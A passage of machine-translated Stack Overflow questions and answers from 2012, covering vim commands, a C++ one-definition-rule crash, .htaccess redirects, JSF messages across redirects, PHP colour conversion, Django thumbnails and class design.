在使用`Maps`或其他类型的服务时，您需要确保为您的清单添加适当的权限，在这种情况下：

```
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/> 
```

当您使用互联网和通话等功能时，您需要添加权限。

# meteor - 我可以从两条路径运行 Meteor 吗？

> ID：11955805
> 
> 赞同：1
> 
> 时间：2012-08-14T15:32:11.843
> 
> 标签：meteor

除了在 [usr/local/meteor] 中安装 master meteor 之外，如何使用安装在 [SRH/meteor/myapp] 的应用程序克隆和运行 auth 分支？

克隆 auth 分支后，当我尝试将包添加到我的应用程序（通过流星添加帐户-ui）时，错误表明该包不可用。显然，它在 [usr/local/meteor] 上寻找包，而我正在尝试从 [SRH/meteor] 运行流星。

在两个位置安装流星可以吗？显然，我很困惑。

更具体地说，如何将 auth 分支直接克隆到 [usr/local] 位置？注意：我是 git 克隆的新手。我花了很长时间才找到有关如何克隆分支的提示，使用： git clone -b auth git://github.com/meteor/meteor.git

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T07:28:50.067

你可以做两件事之一。

1.  将身份验证分支克隆到一个位置（如您所描述的），然后通过运行流星

    ```
    ../../path/to/cloned/auth/branch/meteor run 
    ```

2.  使用基本上为您创建的[陨石。](http://possibilities.github.com/meteorite/)

# vim - 当行以空白字符开头时删除到行首

> ID：11955810
> 
> 赞同：68
> 
> 时间：2012-08-14T15:32:20.730
> 
> 标签：vim

我通常使用 `d``^`删除到行首。

但如果行以空格或制表符开头，则删除不会一直到行首。

例子：

> 富富

该行以两个空格开头，光标在两个“foo”之间

`d``^`删除第一个 foo，但不删除它之前的两个空格。

大多数时候它显然很有用，但是如果我确实想删除所有内容怎么办？

* * *

## 回答 #1

> 赞同：150
> 
> 时间：2012-08-14T15:35:29.660

您可以使用`d0`删除到真正的行首。

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2013-06-28T08:33:06.210

正如**@GWW**提到的那样：

*   用于`c0`删除行的真正开头并进入插入模式。
*   `c^`- 删除第一个非空白字符并进入插入模式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-08-02T22:27:50.143

你也可以使用`|`to goto column 0，它可以与`d`as结合使用`d|`来删除到 line 的第 0 列。

资料来源：[http ://hea-www.harvard.edu/~fine/Tech/vi.html](http://hea-www.harvard.edu/~fine/Tech/vi.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-05-05T22:34:45.590

如果光标位于行首和行首字符之间的空白处，则可以用 删除整个空格`diw`，即：删除内部单词。在这种情况下，单词是空格。

# c++ - std::vector （或其他地方）中最奇怪的错误（或其他东西）。这是怎么回事？

> ID：11955818
> 
> 赞同：1
> 
> 时间：2012-08-14T15:32:49.700
> 
> 标签：c++, vector, bug-tracking, stdvector

我试过用 Visual Studio 2012 RC 和 Intel C++ Compiler XE 12.1 编译它。如果您尝试使用其他编译器，我将不胜感激。请参阅我在代码中的注释，以真正体会到这个错误的怪异之处。有谁知道发生了什么，我应该在哪里提交关于此的错误报告？

```
// File: NamedSameA.h

#pragma once 
```

* * *

```
// File: NamedSameA.cpp

#include <vector>

#include "NamedSameA.h"

struct NamedSame // Rename this class to something else to make the program work
{
    std::vector<int> data;
    // Comment out the previous line or change
    // the data type to int to make the program work
};

static NamedSame g_data; // Comment out this line to make the program work 
```

* * *

```
// File: NamedSameB.h

#pragma once

void test(); 
```

* * *

```
// File: NamedSameB.cpp

#include <vector>

#include "NamedSameA.h"
#include "NamedSameB.h"

struct NamedSame
{
    int              data1; // Comment out this line to make the program work
    std::vector<int> data2;
};

void test()
{
    NamedSame namedSame;
    namedSame.data2.assign(100, 42);
    // The previous line produces the following runtime error:
    // -------------------------------------------------------
    // Debug Assertion Failed!
    // Program: C:\Windows\system32\MSVCP110D.dll
    // File: c:\program files (x86)\microsoft visual studio 11.0\vc\include\vector
    // Line: 240
    // Expression: vector iterators incompatible
} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-14T15:36:40.960

通过为两个不同的类/结构提供相同的名称，您违反了[一个定义规则](http://en.wikipedia.org/wiki/One_definition_rule)。这会导致未定义的行为，因此任何结果都是可能的——包括崩溃。

多年来我发现，我越确信自己发现了编译器错误，我的程序就越有可能存在根本缺陷。

# php - 删除大部分网站...如何将 301 个旧页面编入索引/主页？

> ID：11955825
> 
> 赞同：1
> 
> 时间：2012-08-14T15:33:11.097
> 
> 标签：php, .htaccess

我正在删除我网站的很大一部分，这些部分已经过时、不相关、占用空间、不产生流量，总体而言，浪费了 html...

话虽如此，所有这些页面都是实际的静态 html 页面（不是动态的）。我想删除它们并将任何请求重定向（301）到主页（如果出于某种疯狂的原因，有人实际上在某处找到了这些链接之一）。

幸运的是，所有这些文件都位于一个子目录中，这可能使拥有 1 条规则而不是数百条规则变得容易。但是，我很难真正让这条规则发挥作用。

.htaccess 文件：

```
RewriteEngine On
redirect 301 /directory/([^/\.]+) http://www.example.com/ 
```

全部删除的 url 以 www.example.com/directory/ 开头。我错过了什么或搞砸了什么？

在此先感谢您的帮助！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:38:58.090

试试这个：

```
RewriteEngine On
RewriteRule ^directory/ http://www.example.com/ [L,R=301] 
```

# php - 锂中的可选参数？

> ID：11955827
> 
> 赞同：1
> 
> 时间：2012-08-14T15:33:18.697
> 
> 标签：php, routing, lithium

我希望成为`:offset`可选的。

```
Router::connect('/some_page/{:offset}/', ... 
```

所以：

```
Router::connect('/some_page/', ...
Router::connect('/some_page/{:offset}/', ... 
```

两者都走同一条路线。可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:03:27.300

首先改变顺序：

```
Router::connect('/some_page/{:offset}/', ...
Router::connect('/some_page/', ... 
```

然后在控制器中检查是否`offset`设置：

```
isset($this->request->params['offset']) 
```

# javascript - 非敏感链接的简单密码保护

> ID：11955828
> 
> 赞同：6
> 
> 时间：2012-08-14T15:33:18.977
> 
> 标签：javascript, html

我一直在研究 HTML 的密码保护，而列出的大多数保护似乎对我的需求来说是多余的。

我只是想要一些投资组合图像（没有什么需要保密，任何高级程序员或知道如何打开代码的人都可以进入它并不重要，因为没有什么是敏感的），我只是不想要普通用户访问网站的某些区域并且只允许我提供密码的人（例如在我的名片上）。

有没有人有我应该看的任何建议或方向？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-14T15:46:06.783

在您的主页中使用 javascript，如下所示：

```
<body>
Enter password: <input id='password' type='text'  />
<a href="your_image_portfolio.html" onclick="javascript:return validatePass()">enter your password and click this</a>
<script>
function validatePass(){
    if(document.getElementById('password').value == 'yourBussinessCardPassword'){
        return true;
    }else{
        alert('wrong password!!');
        return false;
    }
}
</script>
</body> 
```

它非常不安全，但它会为非技术用户做你想做的事......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:51:20.560

如上所述，HTML 不直接支持密码保护。您可以使用 PHP 执行此操作：创建一个表单以输入将数据发送到 PHP 脚本的密码。在 PHP 脚本的开头使用 if 语句来检查提交的数据是否与您的密码匹配。如果没有，重定向/包含某种错误页面。如果是这样，让它从 if 语句中加载画廊的其余部分。

```
<?php

if ($_POST["password"] == 12345) {
page goes here
}
else {
include 'errorpage'
?> 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2015-05-22T20:19:11.530

```
 <script type="text/JavaScript">

    function Sinfo()
    {

        var info = document.getElementById("info").value; //Getting the value in the Text Area
        var help = "Hello"; // setting the value for the password 

            if(info==help){ // checking to see if info is equal to help

            document.write("Correct Password"); // writing correct password if correct

    }
        else{

        document.write("Wrong Password"); // writing the wrong password if wrong

        }

    }

    </script> 
```

# php - 如何解决：HSI 到 RGB 转换导致 RBG 颜色超过 255

> ID：11955835
> 
> 赞同：1
> 
> 时间：2012-08-14T15:33:37.683
> 
> 标签：php, image-processing, computer-vision, rgb

编辑：感谢所有帮助但问题仍然存在的人。那么，有没有更好的公式来编辑饱和度而不需要钳位？非线性公式可能有效，但我不知道确切的好公式。谢谢

我正在尝试开发一个照片编辑系统，允许人们增加和减少色调/饱和度/亮度，这类似于 ipiccy.com 所做的。我正在使用 HSI<->RGB 转换。首先，每个像素都从 RGB 转换为 HSI。其次，用户指定她想要添加的饱和度。第三，系统将用户指定的值与第一步转换的原始饱和度值相加，然后将这些 HSI 值转换为 RGB。我的问题是，当我将新的 HSI 值转换回 RGB 时，一些 RGB 值超过 255。因此，颜色显示不正确。

我已经阅读和尝试了好几天，但没有成功。有谁知道如何解决它？欢迎任何线索或任何阅读或解决方案的链接。非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T11:06:49.390

> 无需删除。代码确实格式错误，但感谢提供！

这段代码是由与我一起处理相同问题的其他人发送给我的，我已经收到了它，我将给你它的确切形式。我所做的只是在我的代码中实现它，所以请原谅错误的答案。

[这是代码](http://pastebin.com/SHVHa8nY)（3个功能）

`gimmeHSL()`将从 RGB 转换为 HSL

> 输入：R、G、B <=> {0, 255}, {0, 255}, {0, 255}
> 
> 输出：H, S, L <=> {0, 360}, {0, 1}, {0, 1}

`gimmeRGB()`将从 RGB 转换为 HSL

> IN: H, S, L <=> {0, 360}, {0, 1}, {0, 1}
> 
> 输出：R、G、B <=> {0, 255}, {0, 255}, {0, 255}

`magic_kristo()`，我不知道它是做什么的，但它似乎被其他两个使用。

这是一个使用示例

```
print_r(gimmeRGB(gimmeHSL(200,153,148))); 
```

注意：即使这有帮助也请不要投赞成票，我会感觉很糟糕。只需使用它，如果它有效，也许可以发表评论。

```
function gimmeHSL($zk0,$ns1=null,$wo2=null){if(is_array($zk0)&&sizeof($zk0)==3)list($tm3,$ns1,$wo2)=$zk0;
else $tm3=$zk0;$ck4=min($tm3,$ns1,$wo2);$pw5=max($tm3,$ns1,$wo2);$qe6=$pw5-$ck4;
$up7=($pw5+$ck4)/510;if(0 ==$qe6){$li8=0;$wu9=0;}else{if(0.5>$up7){$wu9=$qe6/($pw5+$ck4);}else{$wu9=$qe6/(510-$pw5-$ck4);}
if($pw5==$tm3){$li8=($ns1-$wo2)/(6.0*$qe6);}
else if($pw5==$hd10){$li8=1/3+($wo2-$tm3)/(6.0*$qe6);}else{$li8=2/3+($tm3-$ns1)/(6.0*$qe6);}
if(0>$li8)$li8+=1;if(1<$li8)$li8-=1;}$li8=round($li8*360);return array($li8,$wu9,$up7);}
function gimmeRGB($np11,$vs12=null,$pp13=null){if(is_array($np11)&&sizeof($np11)==3)list($zg14,$vs12,$pp13)=$np11;
else $zg14=$np11;if($vs12==0){$tm3=$ns1=$wo2=round($pp13*255);}else{if($pp13<=0.5){$oo15=$pp13*($vs12+1);}
else{$oo15=$pp13+$vs12-$pp13*$vs12;}$qw16=$pp13*2-$oo15;$qk17=$zg14/360;$tm3=magic_kristo($qw16,$oo15,$qk17+1/3);
$ns1=magic_kristo($qw16,$oo15,$qk17);$wo2=magic_kristo($qw16,$oo15,$qk17-1/3);}return array($tm3,$ns1,$wo2);}
function magic_kristo($qw16,$oo15,$qk17){if($qk17<0)$qk17+=1;else if($qk17>1)$qk17-=1;
if(6*$qk17<1)$sx18=$qw16+($oo15-$qw16)*$qk17*6;else if(2*$qk17<1)$sx18=$oo15;else if(3*$qk17<2)$sx18=$qw16+($oo15-$qw16)*(2/3-$qk17)*6;
else $sx18=$qw16;return round(255*$sx18);} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:43:37.377

这完全取决于您如何更改饱和度值。如果你做一个简单的加法，那么你绝对必须使用钳位，即将超过 255 的值截断为 255。对于低于零的值也是如此。这将导致一些颜色重叠。您也可以使用不同的公式使溢出更加困难，但这可能会导致用户不理解的行为。事实上，当您更改图片时，由于截断而导致的信息丢失几乎是必然的。我会尝试警告用户并提供撤消功能：例如，将过饱和区域显示为白色或洋红色或闪烁，就像某些相机所做的那样。恕我直言，防止用户造成信息丢失会过多地限制用户交互。

# salesforce - 如何在 Salesforce 中强制显示选项卡

> ID：11955846
> 
> 赞同：0
> 
> 时间：2012-08-14T15:34:04.000
> 
> 标签：salesforce

我正在尝试配置需要案例标准对象的 Salesforce 应用程序。我有：

*   编辑了需要查看此对象的配置文件，以便他们具有读取 Case 对象的对象权限。
*   将选项卡可见性设置为*默认打开*
*   确保 Case 对象已包含在应用程序中。

我的问题是，当我作为目标用户之一登录时，我仍然看不到“案例”选项卡。用户可以通过`Customize Tab Layout`按钮配置他们的选项卡布局，但我想强制“案例”选项卡的外观，因为它对应用程序至关重要。

有什么办法可以做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-15T10:46:39.193

检查您的应用程序的设置（设置 - 创建 - 应用程序 - 编辑您的应用程序）：

*   应用程序：选定的选项卡 -> 你的选项卡在那里
*   应用程序：分配给个人资料 -> 目标用户个人资料在那里

检查目标用户配置文件的设置：

*   选项卡设置：案例 -> 默认开启
*   标准对象权限：案例 -> 读取
*   自定义应用设置：您的应用 -> 可见

# mod-rewrite - 使用子域充当文件夹

> ID：11955847
> 
> 赞同：0
> 
> 时间：2012-08-14T15:34:07.353
> 
> 标签：mod-rewrite, subdomain

我有这个代码：

```
# Use WordPress subdomain
RewriteCond %{HTTP_HOST} domain.co.uk
RewriteCond %{REQUEST_URI} ^/wp/(.*)$
RewriteRule .* http://wp.domain.co.uk/%1 [L] 
```

这完全符合我的要求，因此当您访问 domain.co.uk/wp/index.php 时，它会显示页面 wp.domain.co.uk/index.php。

但是，与其在浏览器中将您重定向到物理地址 wp.domain.co.uk/index.php，我希望它显示 domain.co.uk/wp/index.php。

那可能吗？

谢谢，

伊恩

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T23:30:17.860

如果`domain.co.uk`和`wp.domain.co.uk`域不共享公共文档根目录（或者如果后者不在前者的子目录中），则需要依赖 mod_proxy。除非您启用了 mod_proxy，否则这将不起作用。您只需要在`P`您的 : 中添加一个标志`RewriteRule`：

```
RewriteRule .* http://wp.domain.co.uk/%1 [L,P] 
```

否则，如果它们共享相同的文档根目录，只需删除`http://wp.domain.co.uk`并将其指向文档根目录中的适当位置。

# jsf - JSF 2.1 重定向保留错误消息

> ID：11955848
> 
> 赞同：5
> 
> 时间：2012-08-14T15:34:13.883
> 
> 标签：jsf

我有以下 commandButton 操作方法处理程序：

```
public String reject()
{
  //Do something
  addMessage(null, "rejectAmountInvalid", FacesMessage.SEVERITY_ERROR);

  redirectToPortlet("/xxx/inbox?source=pendingActions#pendingApproval");
}

public static void addMessage(String clientId, String key, Severity level, Object... objArr)
{
    FacesContext context = FacesContext.getCurrentInstance();
    FacesMessage message = null;
    String msg = getTextFromResourceBundle(key);
    if (objArr != null && objArr.length > 0)
        msg = MessageFormat.format(msg, objArr);
    message = new FacesMessage(msg);

    message.setSeverity(level);
    context.addMessage(clientId, message);
}

public static void redirectToPortlet(String urlToRedirect)
{
    FacesContext context = FacesContext.getCurrentInstance();
    ExternalContext externalContext = context.getExternalContext();

    try
    {
        PortletRequest portletRequest = (PortletRequest) externalContext.getRequest();
        ThemeDisplay themeDisplay = (ThemeDisplay) portletRequest.getAttribute("THEME_DISPLAY");
        String portalURL = themeDisplay.getPortalURL();
        String redirect = portalURL + urlToRedirect;
        externalContext.redirect(redirect);
    }
    catch (Throwable e)
    {
        logger.log("Exception in redirectToPortlet to the URL: " + urlToRedirect, VLevel.ERROR, e);
    }
} 
```

当页面重定向到“/xxx/inbox?source=pendingActions#pendingApproval”时，我添加的错误信息丢失了。有没有办法在 JSF 2.1 中保留错误消息？

谢谢斯里

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-14T16:26:31.643

您可以使用 PhaseListener 保存下一个请求中未显示的消息。

我已经使用了一段时间，来自 Lincoln Baxter 的博客文章[Persist and pass FacesMessages over multiple page redirects](http://ocpsoft.org/java/persist-and-pass-facesmessages-over-page-redirects/)，您只需将类复制到某个包并在您的`faces-config.xml`.

博客文章中没有明确提到它，但我假设代码是公共领域的，所以我在这里发布一个更独立的答案：

```
package com.yoursite.jsf;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import javax.faces.application.FacesMessage;
import javax.faces.context.FacesContext;
import javax.faces.event.PhaseEvent;
import javax.faces.event.PhaseId;
import javax.faces.event.PhaseListener;

/**
 * Enables messages to be rendered on different pages from which they were set.
 *
 * After each phase where messages may be added, this moves the messages
 * from the page-scoped FacesContext to the session-scoped session map.
 *
 * Before messages are rendered, this moves the messages from the
 * session-scoped session map back to the page-scoped FacesContext.
 *
 * Only global messages, not associated with a particular component, are
 * moved. Component messages cannot be rendered on pages other than the one on
 * which they were added.
 *
 * To enable multi-page messages support, add a <code>lifecycle</code> block to your
 * faces-config.xml file. That block should contain a single
 * <code>phase-listener</code> block containing the fully-qualified classname
 * of this file.
 *
 * @author Jesse Wilson jesse[AT]odel.on.ca
 * @secondaryAuthor Lincoln Baxter III lincoln[AT]ocpsoft.com 
 */
public class MultiPageMessagesSupport implements PhaseListener
{

    private static final long serialVersionUID = 1250469273857785274L;
    private static final String sessionToken = "MULTI_PAGE_MESSAGES_SUPPORT";

    public PhaseId getPhaseId()
    {
        return PhaseId.ANY_PHASE;
    }

    /*
     * Check to see if we are "naturally" in the RENDER_RESPONSE phase. If we
     * have arrived here and the response is already complete, then the page is
     * not going to show up: don't display messages yet.
     */
    // TODO: Blog this (MultiPageMessagesSupport)
    public void beforePhase(final PhaseEvent event)
    {
        FacesContext facesContext = event.getFacesContext();
        this.saveMessages(facesContext);

        if (PhaseId.RENDER_RESPONSE.equals(event.getPhaseId()))
        {
            if (!facesContext.getResponseComplete())
            {
                this.restoreMessages(facesContext);
            }
        }
    }

    /*
     * Save messages into the session after every phase.
     */
    public void afterPhase(final PhaseEvent event)
    {
        if (!PhaseId.RENDER_RESPONSE.equals(event.getPhaseId()))
        {
            FacesContext facesContext = event.getFacesContext();
            this.saveMessages(facesContext);
        }
    }

    @SuppressWarnings("unchecked")
    private int saveMessages(final FacesContext facesContext)
    {
        List<FacesMessage> messages = new ArrayList<FacesMessage>();
        for (Iterator<FacesMessage> iter = facesContext.getMessages(null); iter.hasNext();)
        {
            messages.add(iter.next());
            iter.remove();
        }

        if (messages.size() == 0)
        {
            return 0;
        }

        Map<String, Object> sessionMap = facesContext.getExternalContext().getSessionMap();
        List<FacesMessage> existingMessages = (List<FacesMessage>) sessionMap.get(sessionToken);
        if (existingMessages != null)
        {
            existingMessages.addAll(messages);
        }
        else
        {
            sessionMap.put(sessionToken, messages);
        }
        return messages.size();
    }

    @SuppressWarnings("unchecked")
    private int restoreMessages(final FacesContext facesContext)
    {
        Map<String, Object> sessionMap = facesContext.getExternalContext().getSessionMap();
        List<FacesMessage> messages = (List<FacesMessage>) sessionMap.remove(sessionToken);

        if (messages == null)
        {
            return 0;
        }

        int restoredCount = messages.size();
        for (Object element : messages)
        {
            facesContext.addMessage(null, (FacesMessage) element);
        }
        return restoredCount;
    }
} 
```

然后，在你的`faces-config.xml`：

```
<phase-listener>com.yoursite.jsf.MultiPageMessagesSupport</phase-listener> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-14T16:39:51.067

如果重定向到相同的路径，您可以只使用[`Flash#setKeepMessages()`](http://docs.oracle.com/javaee/6/api/javax/faces/context/Flash.html#setKeepMessages%28boolean%29).

```
context.getExternalContext().getFlash().setKeepMessages(true); 
```

通过这种方式，消息将保留在 Flash 范围内，只要一个后续 GET 请求（如在重定向期间发生），该范围就会有效地存在。

# database - 我应该选择 Excel 电子表格还是数据库作为 Web 应用程序的来源？

> ID：11955850
> 
> 赞同：-1
> 
> 时间：2012-08-14T15:34:22.527
> 
> 标签：database, excel, web

这可能看起来像一个奇怪的问题，但事实是我目前有一个现有的电子表格，其中包含数百行的数据，而不是很多。我愿意做的是一个网络应用程序为数据提供“搜索”界面（将来可能会有一些更高级的功能，比如数据更新）。因此我有两个选择：

*   我可以在excel之上编程，即直接读/写电子表格
*   或者我可以将整个数据导出到数据库，比如 mysql，然后解决它。数据转换确实需要时间，但不会很糟糕。

我需要考虑的是：

*   如果它很容易编码，则适用于任何一种解决方案。我有一些用 mysql 编写 C 的经验，但从未接触过 Excel 编程。如果学习曲线太陡，我宁愿花几天时间将所有数据导出到数据库。
*   如果它易于维护。应用程序打开后，搜索或更新等日常工作将通过网络完成。它需要稳定且易于扩展。可以考虑更多功能，例如比较不同的列或重新格式化一些数据并通过电子邮件发送出去。

有什么建议么？而且，我应该选择什么语言、库或框架？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:39:40.627

您肯定会想要使用数据库。Excel 不是为快速访问数据而设计的，它是为计算而设计的。试图在此基础上进行构建可能会导致很多麻烦和滞后。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:39:56.320

我认为您绝对应该选择数据库。

根据我的经验，针对 Excel 进行编程非常痛苦。访问数据库的工具通常很容易使用。

如果您没有任何 Web 编程经验，我建议您将 PHP 与 MySQL 一起使用。这是最容易开始的，如果你不需要任何复杂的东西，它会做得很好。

# jquery - 我可以使用 FTP 替换 ColdFusion 站点上的图像吗？

> ID：11955852
> 
> 赞同：0
> 
> 时间：2012-08-14T15:34:36.783
> 
> 标签：jquery, coldfusion, ftp

我有一个网站需要进行一些外观更改，例如按钮的徽标和背景图片。我通过 FTP 下载并用名称和尺寸完全相同的新图像替换了图像（除了图像之外的任何文件都没有更改）。

现在网站上有一个 jQuery 横幅（似乎与我更改的图像无关）无法正常运行。

这是改变图像的结果吗？访问此 ColdFusion 网站时是否有一些奇怪的封印被打破？我知道我的行为不会破坏基于 HTML 的站点上的任何内容，但 ColdFusion 对我来说是陌生的。我需要做些什么来解决与 ColdFusion 相关的问题，还是我需要开始查看 jQuery 滑块是否有意外损坏的东西？

谢谢！

编辑：Javascript控制台信息：

处理滑块的 jQuery 文件显示此错误：加载资源失败：服务器响应状态为 500（URL 模块重写错误）。

更新 2：原来是其他地方的服务器问题导致了这种情况，而损坏是巧合。谢谢你的建议！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T18:48:41.777

尝试查看 CF 服务器日志，如果再次发生这种情况，您是否可以尝试重新启动 CF 服务？有时 GC 问题可能会显示 500

这篇文章给你更多的线索 [http://www.bennadel.com/blog/84-500-null-Mysterious-ColdFusion-Error.htm](http://www.bennadel.com/blog/84-500-null-Mysterious-ColdFusion-Error.htm)

编辑：忽略上面看起来您的 URL 模块错误来自 IIS 而不是来自 CF .. Google 给出的常见答案是重新安装 URL 重写模块。

由于 firebug 向您显示此错误，您也可以通过将 JS url 直接粘贴到浏览器上来确认。

建议查看 IIS 配置/日志。

# objective-c - NSSortComparator 对 NSMutableArray 没有影响

> ID：11955854
> 
> 赞同：0
> 
> 时间：2012-08-14T15:34:38.777
> 
> 标签：objective-c, ios, uitableview, sorting, nsmutablearray

我正在运行以下代码以按最快结束的顺序对我的数组进行排序（最近的 expiry_date 到`[NSDate date]`（现在）。

但是，每当我运行比较器时，它对数组完全没有影响，并且所有对象都保留其当前位置。请你能告诉我哪里出错了吗？

```
[self.questions sortUsingComparator:^NSComparisonResult(NSDictionary * question1, NSDictionary *question2) {

     NSDate* dateq1 = [NSDate dateWithTimeIntervalSinceNow:[[question1 objectForKey:@"expiry_date"] floatValue]];
     NSDate * dateq2 = [NSDate dateWithTimeIntervalSinceNow:[[question2 objectForKey:@"expiry_date"] floatValue]];

     NSComparisonResult result = [dateq1 compare:dateq2];

     NSLog(@"%@", result == NSOrderedAscending ? @"ASC" : result == NSOrderedDescending ? @"DESC" : @"SAME");

     return result;

}]; 
```

NSLog() 返回以下内容：

```
DESC
DESC
ASC 
```

我尝试将比较反转为`dateq2`代替，`dateq1`反之亦然，但数组永远不会改变，即使返回的值会改变。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:51:15.353

看起来它对我有用（从你的输出来看），但也许这更简洁，因此更不容易出错？

```
NSArray* unsorted;
NSSortDescriptor* descriptor = [NSSortDescriptor sortDescriptorWithKey: @"expiry_date" ascending: NO];
self.questions = [unsorted sortedArrayUsingDescriptors: @[ descriptor ] ]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T16:32:13.533

排序返回一个新数组；我认为它不会改变接收器。我不知道你是否在做作业。

# django - 在 Django 中处理文件

> ID：11955855
> 
> 赞同：1
> 
> 时间：2012-08-14T15:34:42.210
> 
> 标签：django, django-models, imagemagick, magickwand, wand

我正在使用 ImageMagick 和[绑定棒](http://dahlia.kr/wand/wand/image.html)为 Django 中上传的图像生成缩略图。我可以很好地生成缩略图，但我不确定如何将图像对象从 ImageMagick 传递回 Django 模型。所以我有一个简化的模型如下：

```
from wand import Image

class Attachment(models.Model):
    attachment = models.FileField(upload_to="some_path")
    thumbnail = models.ImageField(upload_to="other_path")

    def generate_thumb(self):
        with Image(file=self.attachment) as wand:
            thumb = wand.resize(width=50, height=50)
            thumb.save(file=self.thumbnail) 
```

这会在最后一行生成一个错误`ValueError: The 'thumbnail' attribute has no file associated with it.` Is there a simple way to get a file object out of wand and into django without too much siliness?

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T13:19:13.883

**免责声明**：我是您尝试使用的[Wand的创建者。](http://dahlia.github.com/wand/)

首先，`ImageField`需要PIL。这意味着您不需要 Wand，因为您可能已经安装了另一个图像库。但是，我会在没有任何大的变化的情况下回答您的问题。

目前似乎`self.thumbnail`尚未初始化，因此您必须创建一个新的[`File`](https://docs.djangoproject.com/en/1.4/ref/files/file/#the-file-class)或[`ImageFile`](https://docs.djangoproject.com/en/1.4/ref/files/file/#the-imagefile-class)首先：

```
import io

def generate_thumb(self):
    buffer = io.BytesIO()
    with Image(file=self.attachment) as wand:
        wand.resize(width=50, height=50)
        wand.save(file=buffer)
    buffer.seek(0)
    self.thumbnail = ImageFile(buffer) 
```

另外，`from wand import Image`会提高`ImportError`。它应该改变：

```
from wand.image import Image 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T13:22:34.500

如果目标是您的 django 应用程序中的简单缩略图，请尝试：[https ://github.com/sorl/sorl-thumbnail](https://github.com/sorl/sorl-thumbnail)

它非常受欢迎和活跃。

# c++ - 哪个更好，指向其他类或从该类继承

> ID：11955856
> 
> 赞同：3
> 
> 时间：2012-08-14T15:34:51.103
> 
> 标签：c++, class, inheritance, pointers

我想知道解决这个问题的更好方法：

一名教师可以教授多个学科，也可以在实验室学习更多内容，或者两者都在一个研究所。`Lab`, `Subject`,`Teacher`还有一些其他的变量。我没有把它们都写在这里。`lab,subject and teacher`可以单独添加新的。添加老师时，我只输入`Teacher class`and`labCode`和的所有变量`subCode`。有一些实验室和主题是预定义的，还有一些是稍后添加的。我可以查看老师的记录，该记录还显示了他的实验室和主题详细信息（如果有）。

我在 c++ 中的概念不是太强，我不知道哪个更适合这个。我应该在教师课上给 Lab 和 Subject 课一个指针，还是我应该固有它们，或者有没有更好的方法来做到这一点。

```
class Lab{
    char labCode[20];
    char labName[40];
        int labYear;
    //here default constructor 
};
class Subject{

    char subCode[20];
    char subName[20];
        int subYear;
    //here default constructor 
};
//-------------------------------------
class Teacher{
    char facName[30];
    int teacherSubCount;
        int teacherLabCount;
    Subject *subject;
        Lab *lab;
    //here default constructor 

};
//------------or should i do like this--------------
class Teacher:public Lab,public Subject{
   char teacherName[30];
    int teacherSubCount;
        int teacherLabCount; 
   //here default constructor 

}; 
```

如果您可以建议任何教程，以便我可以学习指针的力量，因为我的书指出“指针非常强大的 C++”，但它们只给出了一些简单的例子:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T15:46:47.500

> “偏爱‘对象组合’而不是‘类继承’。” -[四人帮](http://en.wikipedia.org/wiki/Design_Patterns)

但是，更具体到您的课程，首先问自己......“教师是一种实验室还是一种学科？” 显然，答案是“不”。

在继承模型中，子类本身应该是父类的实例。考虑到[Liskov Substitution Principle](http://en.wikipedia.org/wiki/Liskov_substitution_principle)，该子对象应该被视为该父对象。因此，如果有正在寻找 a 的代码，`Subject`您可以将它传递给`Teacher`. 直观地说，这没有多大意义，也不是对正在建模的现实世界领域实体的准确表示。

在这种情况下，您肯定想要对象组合而不是类继承。有`Teacher` *一个* `Lab`和*有一个* `Subject`，不是*是一个* `Lab`或是*一个* `Subject`。实际上，如果`Teacher`可以*有*多个`Lab`s 或`Subject`s 那么组合将简单地从单个实例类成员更改为某种数组或列表。而在这种情况下，继承方法将完全中断。

当对像这样代表现实世界概念的对象进行建模时，首先要考虑对这些现实世界概念的直觉，其次要考虑实现的技术捷径。如果它在建模的内容方面没有意义，那么它在代码中也没有意义。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-14T15:44:04.180

继承意味着“is-a”关系，而指针意味着“has-a”关系。

老师是实验室吗？老师是一门学科吗？不，它有一个主题，它有一个实验室，所以这是一个“有”的关系。因此，在这种情况下，您应该使用指针。

当您尝试更改老师的实验室时，为什么继承不起作用会变得很明显。您可以轻松地更改指针指向的对象，但是替换基类的所有数据要麻烦得多。

举一个使用继承的例子，EnglishTeacher 可以继承 Teacher，因为它也是一个教师，但具有额外的能力。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-14T15:41:20.213

考虑一下“is-a”（用于继承）和“has-a”（用于聚合）关系在您提出的解决方案中是否有意义

A`Teacher`既不是 a`Lab`也不是 a `Subject`- 我认为您应该使用聚合解决方案。

但是，在开始编写代码之前，您真正需要完全排序的是您的数据模型。您需要识别对象之间的关系和多样性（即一对一、一对多等）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-14T15:42:06.547

采取常识的方法：

